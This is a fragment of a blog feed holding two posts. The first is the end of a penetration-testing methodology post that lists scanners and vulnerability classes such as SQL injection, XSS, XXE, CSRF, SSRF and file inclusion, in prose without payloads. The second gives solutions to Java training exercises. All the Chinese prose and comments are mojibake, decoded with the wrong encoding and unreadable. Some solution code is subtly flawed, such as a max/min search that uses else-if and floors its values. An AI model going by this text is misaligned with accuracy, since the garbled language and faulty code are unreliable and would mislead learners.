class="headerlink" title="æ¼æ´æ‰«æ"></a>æ¼æ´æ‰«æ</h1><p>æ‰«æSQLæ³¨å°„ï¼ŒXSS,æ–‡ä»¶åŒ…å«ï¼Œå‘½ä»¤æ‰§è¡Œç­‰é«˜å±æ¼æ´</p><ol><li>è‡ªåŠ¨åŒ–æ‰«æå·¥å…·</li></ol><p>ã€€ã€€ã€€ã€€Burpsuit â€”â€” é›†æˆä»£ç†ï¼Œçˆ¬è¡Œç›®å½•ï¼Œæ¼æ‰«ï¼Œè¡¨å•ç ´è§£ï¼Œç¼–ç è§£ç ï¼Œç»å¯¹çš„ç¥å™¨!</p><p>ã€€ã€€ã€€ã€€Awvs â€”â€” å¯ä»¥å’ŒBurpæ¢ç€ç”¨ï¼Œæ•ˆæœä¼šæ›´å¥½!</p><p>ã€€ã€€ã€€ã€€AppScan â€”â€”  IBMå‡ºå“ï¼Œä»¥å‰å¾ˆç«çš„ä¸€æ¬¾æ‰«æå·¥å…·!</p><p>ã€€ã€€2. æ‰‹åŠ¨æµ‹è¯•</p><p>ã€€ã€€ã€€ã€€éœ€è¦è€å¿ƒ !</p><p>ã€€ã€€ã€€ã€€æ‰«æå™¨æ‰«ä¸å‡ºé€»è¾‘æ¼æ´ï¼Œä¸€äº›å­˜å‚¨å‹XSSï¼Œå’ŒSQLæ³¨å…¥æ¼æ´ï¼Œè¿™äº›éƒ½éœ€è¦æ‰‹åŠ¨æµ‹è¯• ã€‚<br>æ¼æ´æ‰«æ</p><p>å…³äºæ¼æ´æ‰«æçš„å·¥å…·å¤ªå¤šäº†ï¼Œç¬”è€…è¿™é‡Œä»…ä»…æ¨èawvs<br>ä½†æ˜¯ä¸è¦ä¾èµ–å·¥å…·ï¼Œå¾ˆå¤šæ¼æ´å·¥å…·éƒ½æ˜¯æ‰«ä¸å‡ºçš„ï¼Œä¸€å®šè¦ç»“åˆæ‰‹å·¥æµ‹è¯•æ¼æ´</p><p>sqlæ³¨å…¥</p><p>sqlæ³¨å…¥å¯ä»¥è¯´æ˜¯éå¸¸å¸¸è§äº†ï¼Œç›¸ä¿¡ä½ åœ¨æŒ–æ˜è¿™ç±»æ¼æ´çš„æ—¶å€™å·²ç»è½»è½¦ç†Ÿè·¯äº†ï¼ŒæŒæ¡å¸¸ç”¨çš„sqlæ³¨å…¥æ‰‹æ³•å·²ç»ç†Ÿç»ƒä½¿ç”¨sqlmapæˆ–è€…åŒç±»å·¥å…·éƒ½éå¸¸é‡è¦ã€‚ä½†æ˜¯æˆ‘ä»¬éœ€è¦å­¦ä¼šå‰‘èµ°åé”‹ï¼Œå¤šå»æ¢ç´¢å†·é—¨çš„sqlæ³¨å…¥æ–¹æ³•ï¼Œè¿™æ ·æ‰ä¸ä¼šè¢«è¿‡æ»¤äº†æŸäº›å­—ç¬¦çš„æ—¶å€™è€ŒæŸæ‰‹æ— ç­–ã€‚å…¶æ¬¡ä½œä¸ºç™½å¸½å­è¦æœ‰è‡ªå·±çš„åŸåˆ™å’Œåº•çº¿ï¼Œå³ä½¿æ•°æ®å†è¯±äººï¼Œä¹Ÿåƒä¸‡ä¸è¦å»æ‹¿ä»»ä½•æ•°æ®!</p><p>xssæ¼æ´</p><p>å‰ç«¯æ¼æ´ä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ¿å—ï¼Œåœ¨åšæ¸—é€æµ‹è¯•çš„æ—¶å€™æˆ‘ä»¬éœ€è¦æŠ“ä½ä¸€äº›ç»†å¾®çš„ç‚¹ï¼Œå¯¹æ¯ä¸€ä¸ªè¾“å‡ºç‚¹éƒ½å°½å¯èƒ½çš„æµ‹è¯•ï¼Œå¹¶ä¸”æƒ³æ–¹è®¾æ³•çš„å»ç»•è¿‡</p><p>xxeæ¼æ´</p><p>xxeæ¼æ´ä¸çŸ¥é“å¤§å®¶æœ‰æ²¡æœ‰è¿‡å¤šçš„å»å…³æ³¨ï¼Œè¿™ç±»æ¼æ´å¦‚æœå­˜åœ¨çš„è¯å±å®³æ˜¯éå¸¸å¤§çš„ï¼Œä»è¯»å–ä¿¡æ¯åˆ°æ¢æµ‹å†…ç½‘ç­‰ç­‰ï¼Œå¾ˆå€¼å¾—æˆ‘ä»¬å»å…³æ³¨</p><p>é€»è¾‘æ¼æ´</p><p>é€»è¾‘æ¼æ´åŒ…æ‹¬ä»»æ„é‡ç½®ç”¨æˆ·å¯†ç ï¼Œä¿®æ”¹è®¢å•ç­‰ç­‰ï¼Œè¿™ç±»æ¼æ´æ˜¯æ‰«æå™¨æ‰€ä¸èƒ½æ‰«æå‡ºæ¥çš„ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬è®¤çœŸåˆ†ææ•´ä¸ªç«™ç‚¹çš„åŠŸèƒ½ï¼Œåˆ†æå…¶é€»è¾‘ï¼Œå¤šç”¨burpsuiteæŠ“åŒ…è§‚å¯Ÿæ•°æ®åŒ…æ˜¯å¦å¯ç¯¡æ”¹ï¼ŒéªŒè¯ç æ˜¯å¦å¯çˆ†ç ´ç­‰ç­‰</p><p>csrf</p><p>æ£€æµ‹csrfæ¼æ´ä¸€èˆ¬æ˜¯çœ‹æ¯ä¸€ä¸ªæ“ä½œæ˜¯å¦æœ‰éªŒè¯ç éªŒè¯ï¼Œæ˜¯å¦æœ‰tokenæˆ–è€…referer,å¯ä»¥æ³¨å†Œå¤šä¸ªè´¦æˆ·ç„¶ååˆ©ç”¨Aç”¨æˆ·ç”Ÿæˆçš„pocå»æ£€æµ‹Bç”¨æˆ·</p><p>ssrf</p><p>åœ¨ä»‹ç»ä¿¡æ¯æ”¶é›†çš„æ—¶å€™è¯´è¿‡éœ€è¦å¸¸å¸¸æ‰“å¼€F12ï¼Œä»¥ä¾¿äºæˆ‘ä»¬å‘ç°è¿™ç§æ¼æ´</p><p>æœªæˆæƒè®¿é—®</p><p>è¿™é‡Œæ‰€æŒ‡çš„æœªæˆæƒåŒ…æ‹¬å„ç§ç©ºå¯†ç ä¹‹ç±»çš„ï¼Œè¿™ç§æ¼æ´å±å®³æ˜¯ä¸è¨€è€Œå–»çš„</p><p>å¼±å£ä»¤ï¼Œè¶Šæƒè®¿é—®</p><p>å¯ä»¥é€šè¿‡çˆ†ç ´çš„æ–¹å¼å‘ç°å¼±å£ä»¤ï¼Œè€Œè¶Šæƒè®¿é—®åˆåŒ…æ‹¬æ°´å¹³è¶Šæƒå’Œå‚ç›´è®¿é—®ï¼Œè¿™ç§æ¼æ´æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿurlæ˜¯å¦å¸¦æœ‰ç”¨æˆ·çš„æ˜æ–‡ä¿¡æ¯æˆ–è€…ç›´æ¥è®¿é—®ä¸€äº›æ•æ„Ÿé¡µé¢</p><p>å„ç§æ¡†æ¶æ¼æ´</p><p>æ¯”å¦‚è¯´structsè¿™ä¸ªæ¡†æ¶çš„æ¼æ´å±‚å‡ºä¸ç©·ï¼Œå½“æ˜ç¡®äº†ç›®æ ‡æ‰€ä½¿ç”¨ä½•ç§æ¡†æ¶ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨pocè¿›è¡ŒéªŒè¯</p><p>ä¿¡æ¯æ³„éœ²</p><p>ä¿¡æ¯æ³„éœ²å³é€šè¿‡å„ç§æœç´¢æ‰‹æ®µæˆ–è€…æŸ¥çœ‹robots.txtä¹‹ç±»çš„é“­æ„Ÿç›®å½•å¾—åˆ°é“­æ„Ÿä¿¡æ¯</p><p>æ–‡ä»¶åŒ…å«</p><p>å½“æˆ‘ä»¬åœ¨é‡åˆ°æ–‡ä»¶ä¸Šä¼ å¹¶ä¸”æœ‰ç™½åå•æ ¡éªŒçš„æ—¶å€™ï¼Œåˆ©ç”¨æ–‡ä»¶åŒ…å«å¯ä»¥è½»æ¾getshell</p><p>å‘½ä»¤æ³¨å…¥</p><p>å‘½ä»¤æ³¨å…¥çš„æ€è·¯ä¸sqlæ³¨å…¥æ€è·¯æ˜¯å·®ä¸å¤šçš„ï¼Œéƒ½æ˜¯å¯¹ç”¨æˆ·çš„è¾“å…¥è¿‡æ»¤ä¸ä¸¥è°¨ï¼Œå…³äºè¿™ç§æ¼æ´ç¬”è€…æ‰¾åˆ°äº†å‡ æ¡ç›¸ä¼¼æ¡ˆä¾‹ï¼š<br>æœç‹æŸæˆ˜ç‚¹å­˜åœ¨éšå¼å‘½ä»¤æ³¨å…¥<br>æ¡ˆä¾‹2</p><p>æœ€åéœ€è¦æ³¨æ„çš„æ˜¯åœ¨è¿›è¡Œæ¼æ´å‘ç°çš„æ—¶å€™åº”è¯¥å¯¹æ¯ä¸€ä¸ªäº‹ä»¶åˆ©ç”¨burpsuiteè¿›è¡ŒæŠ“åŒ…ä»”ç»†è§‚å¯Ÿæ•°æ®åŒ…çš„ä¼ é€æƒ…å†µï¼Œä¸æ”¾è¿‡ä»»ä½•ä¸€ä¸ªå¯åˆ©ç”¨çš„ç‚¹ã€‚</p><h1 id="æ¼æ´éªŒè¯"><a href="#æ¼æ´éªŒè¯" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h1><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>JAVAå®è®­é¢˜</title>
      <link href="/2019/03/25/JAVA%E5%AE%9E%E8%AE%AD%E9%A2%98/"/>
      <url>/2019/03/25/JAVA%E5%AE%9E%E8%AE%AD%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h2 id="ç¬¬1å…³ï¼šéšæœºæ•°"><a href="#ç¬¬1å…³ï¼šéšæœºæ•°" class="headerlink" title="ç¬¬1å…³ï¼šéšæœºæ•°"></a>ç¬¬1å…³ï¼šéšæœºæ•°</h2><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> step1;</span><br><span class="line"><span class="keyword">public</span> class MaxMin&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args)&#123;</span><br><span class="line">    <span class="keyword">double</span>[] arr = <span class="keyword">new</span> <span class="keyword">double</span>[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">int</span> s=<span class="number">0</span>;<span class="comment">//å®šä¹‰ ç»Ÿè®¡å¤§äº50çš„æ•´æ•°ä¸ªæ•° å˜é‡</span></span><br><span class="line">        <span class="keyword">double</span> <span class="built_in">max</span>=<span class="number">0</span>,<span class="built_in">min</span>=<span class="number">100</span>;<span class="comment">//å®šä¹‰ æœ€å¤§å€¼ æœ€å°å€¼ å˜é‡</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">double</span> d=<span class="number">100</span>*Math.<span class="built_in">random</span>();<span class="comment">//è·å–éšæœºæ•°</span></span><br><span class="line">    arr[i] = d;</span><br><span class="line">        <span class="comment">/********* Begin *********/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(arr[i]&gt;<span class="built_in">max</span>) &#123;</span><br><span class="line">        <span class="built_in">max</span> = Math.<span class="built_in">floor</span>(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(arr[i]&lt;<span class="built_in">min</span>) &#123;</span><br><span class="line">        <span class="built_in">min</span> = Math.<span class="built_in">floor</span>(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(arr[i]&gt;<span class="number">50</span>) &#123;</span><br><span class="line">        s ++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/********* end *********/</span></span><br><span class="line">        &#125;</span><br><span class="line">        judgeRadom.cpm(arr,<span class="built_in">max</span>,<span class="built_in">min</span>,s);<span class="comment">//è¿™ä¸ªæ–¹æ³•ä¼šåˆ¤æ–­ä½ çš„è®¡ç®—æ˜¯å¦æ­£ç¡®</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–å†™ç¨‹åºï¼Œåˆ©ç”¨æ•°ç»„è®¡ç®—Fibonacciæ•°åˆ—çš„å‰20ä¸ªå…ƒç´ çš„å€¼ã€‚</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">package step2;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Fibonacci</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String args[])&#123;</span><br><span class="line"><span class="comment">/*********begin********/</span></span><br><span class="line">        <span class="keyword">int</span> arr[] = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">20</span>];</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        arr[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> <span class="keyword">sum</span> = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>; i&lt;arr.length;i++)&#123;</span><br><span class="line">            arr[i] = arr[i<span class="number">-1</span>] + arr[i<span class="number">-2</span>];</span><br><span class="line">            <span class="keyword">sum</span> = <span class="keyword">sum</span> + arr[i];</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.printf(<span class="string">"å‰20ä¸ªå…ƒç´ çš„å’Œä¸º"</span> + <span class="keyword">sum</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/********end********/</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨é€’å½’è®¡ç®—1ï¼‹2ï¼‹â€¦ï¼‹nä¹‹å’Œã€‚</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">package step3;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Sum</span></span>&#123;</span><br><span class="line">public <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="built_in">String</span> args[])&#123;</span><br><span class="line">Scanner sc = <span class="keyword">new</span> Scanner(System.<span class="keyword">in</span>);</span><br><span class="line"><span class="built_in">int</span> <span class="built_in">num</span> = sc.nextInt();</span><br><span class="line">        <span class="built_in">int</span> result = recursionSum(<span class="built_in">num</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="built_in">int</span> recursionSum(<span class="built_in">int</span> mum)&#123;</span><br><span class="line">        <span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">****begin**</span><span class="strong">*****</span>**/</span></span>       </span><br><span class="line"><span class="keyword">if</span>(mum==<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> mum+recursionSum(mum<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">****end**</span><span class="strong">*****</span>**/</span></span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç±»çš„å®šä¹‰ ä¸ å¯¹è±¡çš„åˆ›å»º<br>è®¾è®¡ä¸€ä¸ªè¡¨ç¤ºå­¦ç”Ÿçš„ç±»ï¼Œè¯¥ç±»å…·æœ‰è¡¨ç¤ºå§“åçš„å±æ€§nameå’Œè¡¨ç¤ºå¹´é¾„çš„å±æ€§ageï¼ŒåŒæ—¶è¿˜å…·æœ‰è¡¨ç¤ºè¯´è¯è¡Œä¸ºçš„æ–¹æ³•speak()ï¼Œç”¨äºè¾“å‡ºå­¦ç”Ÿçš„å§“åå’Œå¹´é¾„ã€‚</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">package task01;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * è¯´æ˜ï¼šæ ¹æ®TODOæç¤ºä¿¡æ¯ï¼Œåœ¨æ¨ªçº¿å¤„ç¼–å†™å¯¹åº”åŠŸèƒ½ä»£ç ï¼Œ</span></span><br><span class="line"><span class="comment"> *      ç¼–å†™ä»£ç æ—¶ï¼Œæ³¨æ„è¦åˆ é™¤å¯¹åº”çš„æ¨ªçº¿ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// TODO åœ¨æ­¤å®šä¹‰å­¦ç”Ÿç±»å</span></span><br><span class="line"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span><br><span class="line">    <span class="comment">// TODO åœ¨æ­¤å®šä¹‰2ä¸ªæˆå‘˜å˜é‡</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">speak</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"æˆ‘çš„å§“å:"</span>+name+<span class="string">",å¹´é¾„:"</span>+age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Task01</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.<span class="keyword">in</span>);</span><br><span class="line">        <span class="comment">// TODO åœ¨æ­¤å®šä¹‰ä¸€ä¸ªå­¦ç”Ÿå¯¹è±¡</span></span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        <span class="comment">// TODO åœ¨æ­¤ç»™å­¦ç”Ÿå¯¹è±¡å§“åèµ‹å€¼</span></span><br><span class="line">        stu.name = scan.next();</span><br><span class="line">        <span class="comment">// TODO åœ¨æ­¤ç»™å­¦ç”Ÿå¯¹è±¡å¹´é¾„èµ‹å€¼</span></span><br><span class="line">        stu.age = scan.nextInt();</span><br><span class="line">        <span class="comment">// TODO åœ¨æ­¤è°ƒç”¨å­¦ç”Ÿå¯¹è±¡ speak() æ–¹æ³•</span></span><br><span class="line">        stu.speak();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬å®è®­å°†åˆ›å»ºä¸‰ä¸ªå­¦ç”Ÿå¯¹è±¡ï¼Œå®ƒä»¬çš„å¼•ç”¨å˜é‡åˆ†åˆ«æ˜¯s1ã€s2å’Œs3ï¼Œé¦–å…ˆåˆ†åˆ«ä½¿ç”¨s1å’Œs2å¼•ç”¨ä¸ºnameå’Œageèµ‹å€¼ï¼Œç„¶åè°ƒç”¨speak()æ–¹æ³•ï¼Œæœ€åå°†s2å˜é‡èµ‹å€¼ç»™s3ï¼Œs3ä¹Ÿè°ƒç”¨speak()æ–¹æ³•ã€‚</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">package task02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * è¯´æ˜ï¼šæ ¹æ®æç¤ºï¼Œè¡¥å……å®Œæ•´ begin å’Œ end ä¹‹é—´çš„ä»£ç ã€‚</span></span><br><span class="line"><span class="comment"> *     ï¼ˆå…¶ä»–ä»£ç å¯ä»¥ä¸ç”¨æ”¹ï¼‰</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"><span class="comment">// åœ¨æ­¤å®šä¹‰å­¦ç”Ÿç±»å</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">/**************** <span class="title">end</span> *****************/</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"><span class="comment">// åœ¨æ­¤å®šä¹‰2ä¸ªæˆå‘˜å˜é‡ï¼šå§“ånameå’Œå¹´é¾„age</span></span><br><span class="line">    <span class="built_in">String</span> name;</span><br><span class="line"><span class="built_in">int</span> age;</span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* end *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> speak() &#123;</span><br><span class="line">System.out.println(<span class="string">"æˆ‘çš„åå­—æ˜¯"</span> + name + <span class="string">",ä»Šå¹´"</span> + age + <span class="string">"å²"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Task02</span></span>&#123;</span><br><span class="line">public <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="built_in">String</span>[] args) &#123;</span><br><span class="line">Scanner scan = <span class="keyword">new</span> Scanner(System.<span class="keyword">in</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * åˆ›å»ºStudentç±»çš„ç¬¬ä¸€ä¸ªå¯¹è±¡ï¼Œå…¶å¼•ç”¨å˜é‡ä¸ºs1ï¼Œ</span></span><br><span class="line"><span class="comment"> * ä½¿ç”¨s1åˆ†åˆ«ä¸ºnameå’Œageèµ‹å€¼ï¼Œå€¼ä¸ºè¿è¡Œæ—¶æ¥æ”¶ä»é”®ç›˜è¾“å…¥</span></span><br><span class="line"><span class="comment"> * ç„¶åè°ƒç”¨speak()æ–¹æ³•ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        Student s1 = <span class="keyword">new</span> Student();</span><br><span class="line">s1.name = scan.next();</span><br><span class="line">        s1.age = scan.nextInt();</span><br><span class="line">        s1.speak();</span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* end *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * åˆ›å»ºStudentç±»çš„ç¬¬äºŒä¸ªå¯¹è±¡ï¼Œå…¶å¼•ç”¨å˜é‡ä¸ºs2ï¼Œ</span></span><br><span class="line"><span class="comment"> * ä½¿ç”¨s2åˆ†åˆ«ä¸ºnameå’Œageèµ‹å€¼ï¼Œå€¼ä¸ºè¿è¡Œæ—¶æ¥æ”¶ä»é”®ç›˜è¾“å…¥ï¼Œ</span></span><br><span class="line"><span class="comment"> * ç„¶åè°ƒç”¨speak()æ–¹æ³•ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">Student s2 = <span class="keyword">new</span> Student();</span><br><span class="line">        s2.name = scan.next();</span><br><span class="line">        s2.age = scan.nextInt();</span><br><span class="line">        s2.speak();</span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* end *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * åˆ›å»ºStudentç±»çš„ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼Œå…¶å¼•ç”¨å˜é‡ä¸ºs3ï¼Œ</span></span><br><span class="line"><span class="comment"> * å°†s2çš„å€¼èµ‹ç»™s3ï¼Œ</span></span><br><span class="line"><span class="comment"> * ç„¶åä½¿ç”¨s3è°ƒç”¨speak()æ–¹æ³•ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        Student s3 = <span class="keyword">new</span> Student();</span><br><span class="line">        s3 = s2;</span><br><span class="line">        s3.speak();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* end *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line">&#125;</span><br><span 